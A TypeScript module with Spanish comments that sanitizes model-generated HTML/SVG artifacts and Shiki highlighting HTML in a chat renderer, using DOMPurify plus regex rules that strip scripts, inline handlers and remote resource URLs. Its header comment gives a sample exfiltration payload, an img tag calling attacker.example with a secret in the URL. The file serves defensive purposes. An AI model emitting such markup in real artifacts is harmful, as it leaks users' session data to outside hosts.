/**
 * T3 (Ola 1b) / EGO-FIND-61 — Sanitización del HTML que entra en el DOM del
 * renderer.
 *
 * ## Por qué
 * El chat renderiza Markdown con un parser propio que emite **nodos de
 * texto** de React (auto-escapados): esa ruta no inyecta HTML. Los dos
 * puntos donde sí entra HTML son:
 *
 *  1. `shiki-highlight.tsx` → `dangerouslySetInnerHTML` con el HTML del
 *     worker de Shiki.
 *  2. `artifact-card.tsx` → `<iframe srcDoc={...}>` con el artifact
 *     HTML/SVG que produce el modelo.
 *
 * El (2) es el vector de exfiltración: un artifact con
 * `<img src="https://attacker.example/?x=<secreto>">` hace que el renderer
 * pida esa URL (con cookies/token de sesión en el `Referer`). La CSP
 * `img-src 'self' data: blob:` ya lo bloquea en el navegador; el sanitizado
 * lo cierra **en la raíz**: la URL remota ni siquiera llega al DOM.
 *
 * ## Dos capas, dos responsabilidades (D3: no se reimplementa el sanitizador)
 * 1. **DOMPurify** (primitive de librería) aplica el **allowlist estructural**
 *    de tags y atributos: qué elementos y qué atributos sobreviven. Es lo que
 *    impide `<script>`, `<iframe>`, `<style>`, `<object>`, handlers, etc.
 * 2. La **política de Ego** (`enforceLocalResourcePolicy`) aplica las reglas
 *    que DOMPurify por diseño NO impone:
 *    - **solo recursos locales** (DOMPurify permite `http(s):` en
 *      `href`/`src` porque su allowlist de URI es la de un documento web;
 *      aquí un artifact no puede pedir nada a la red),
 *    - **sin handlers inline**,
 *    - **sin elementos que carguen o ejecuten** (`script`, `style`, `iframe`,
 *      `object`, `embed`, `link`, `meta`, `form`).
 *
 * La capa 2 es una transformación de cadena **determinista y testeable en
 * cualquier DOM** (no depende del parser del entorno). La capa 1 es la que
 * aporta la potencia del parser. En Chromium (Electron) se aplican las dos;
 * la 2 es idempotente allí.
 */
import DOMPurify from "dompurify";

/**
 * Recursos que pueden sacar datos del proceso: cualquier URL con esquema
 * (`https:`, `http:`, `file:`, `javascript:`, `data:text/html`…) o
 * protocol-relative (`//host`).
 */
export const REMOTE_RESOURCE_RE = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;

/** `data:` de imagen raster embebida: local, no exfiltra. */
const LOCAL_DATA_IMAGE_RE = /^data:image\/(?:png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+/=]+$/i;

/**
 * ¿El valor de un atributo de recurso apunta fuera de la app?
 *
 * `data:image/svg+xml` NO se considera local: un SVG embebido puede llevar
 * script, así que se trata como remoto.
 */
export function isRemoteResource(value: string): boolean {
  const v = (value ?? "").trim();
  if (v.length === 0) return false;
  if (LOCAL_DATA_IMAGE_RE.test(v)) return false;
  return REMOTE_RESOURCE_RE.test(v);
}

/** Atributos que pueden cargar un recurso (y por tanto exfiltrar). */
const RESOURCE_ATTRIBUTES = [
  "src",
  "href",
  "xlink:href",
  "srcset",
  "data",
  "action",
  "formaction",
  "poster",
  "background",
] as const;

/** Atributos de evento inline (`onclick`, `onerror`, …). */
const EVENT_ATTRIBUTE_RE = /\s+on[a-z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi;

/** Atributo de recurso con su valor: `src="…"`, `href='…'`, `src=valor`. */
const RESOURCE_ATTRIBUTE_RE = new RegExp(
  `\\s+(${RESOURCE_ATTRIBUTES.join("|")})\\s*=\\s*(?:"([^"]*)"|'([^']*)'|([^\\s>]+))`,
  "gi"
);

/**
 * Elementos que un artifact NUNCA puede contener (con su contenido): no
 * ejecutan, no cargan nada y no abren formularios.
 */
const FORBIDDEN_ELEMENTS: readonly string[] = [
  "script",
  "style",
  "iframe",
  "object",
  "embed",
  "applet",
  "link",
  "meta",
  "base",
  "form",
  "input",
  "button",
  "select",
  "option",
  "textarea",
  "noscript",
  "template",
  "frame",
  "frameset",
  "audio",
  "video",
  "source",
  "track",
];

/** Expresión que elimina un elemento prohibido con su contenido. */
function forbiddenElementPattern(tag: string): RegExp {
  return new RegExp(`<${tag}\\b[^>]*>[\\s\\S]*?<\\/${tag}\\s*>`, "gi");
}

/**
 * Capa 2 — política de Ego sobre el HTML.
 *
 * Elimina (a) los elementos que ejecutan o cargan, (b) los atributos de
 * evento inline y (c) los atributos de recurso cuyo valor apunte fuera de
 * la app. Es **idempotente**: aplicarla dos veces da el mismo resultado.
 */
export function enforceLocalResourcePolicy(html: string): string {
  if (!html) return "";
  let out = html;
  for (const tag of FORBIDDEN_ELEMENTS) {
    out = out.replace(forbiddenElementPattern(tag), "");
    // Variante sin etiqueta de cierre (elementos vacíos: <script src=…>).
    out = out.replace(new RegExp(`<${tag}\\b[^>]*>`, "gi"), "");
  }
  out = out.replace(EVENT_ATTRIBUTE_RE, "");
  out = out.replace(
    RESOURCE_ATTRIBUTE_RE,
    (match, _attr: string, dq?: string, sq?: string, uq?: string) => {
      const value = dq ?? sq ?? uq ?? "";
      return isRemoteResource(value) ? "" : match;
    }
  );
  return out;
}

/**
 * Instancia **fresca** de DOMPurify por llamada.
 *
 * Motivo (medido): el export por defecto de DOMPurify es un singleton con
 * estado mutable compartido (`ALLOWED_TAGS`/`ALLOWED_ATTR` se re-resuelven
 * en cada `sanitize` con config distinta) → dos llamadas con configs
 * diferentes se influyen y el resultado deja de ser determinista. La
 * fábrica `DOMPurify(window)` crea una instancia nueva con estado limpio.
 */
function freshPurifier(): { sanitize(dirty: string): string } {
  if (typeof window !== "undefined") {
    return DOMPurify(window) as unknown as { sanitize(dirty: string): string };
  }
  return DOMPurify as unknown as { sanitize(dirty: string): string };
}

/**
 * Sanea el HTML de un artifact del chat (HTML/SVG generado por el modelo).
 *
 * Devuelve una cadena segura para `iframe srcDoc` / `dangerouslySetInnerHTML`.
 */
export function sanitizeArtifactHtml(html: string): string {
  if (!html) return "";
  try {
    // DOMPurify con la configuración por defecto: allowlist estructural de
    // tags y atributos (elimina `script`, `iframe`, `style`, `object`,
    // handlers inline, etc.). La política de recursos la aplica la capa 2.
    const purified = freshPurifier().sanitize(html);
    return enforceLocalResourcePolicy(purified);
  } catch {
    // Fail-closed: si el saneador falla, no se inyecta nada.
    return "";
  }
}

/**
 * Sanea el HTML producido por el worker de Shiki.
 *
 * Aquí la fuente es **nuestro propio worker** (no entrada de usuario): Shiki
 * escapa el contenido del código. Por eso la pasada es la **capa 2**
 * (política de Ego) y no el allowlist estructural de DOMPurify: el HTML de
 * Shiki depende de sus `class` (`shiki`, `line`) y de su `style` inline
 * (el tema vive ahí), y un allowlist que los elimine rompería el resaltado.
 *
 * La capa 2 sigue eliminando `<script>`, handlers inline y cualquier carga
 * remota: es la pasada defensiva que el plan pide.
 */
export function sanitizeShikiHtml(html: string): string {
  if (!html) return "";
  return enforceLocalResourcePolicy(html);
}
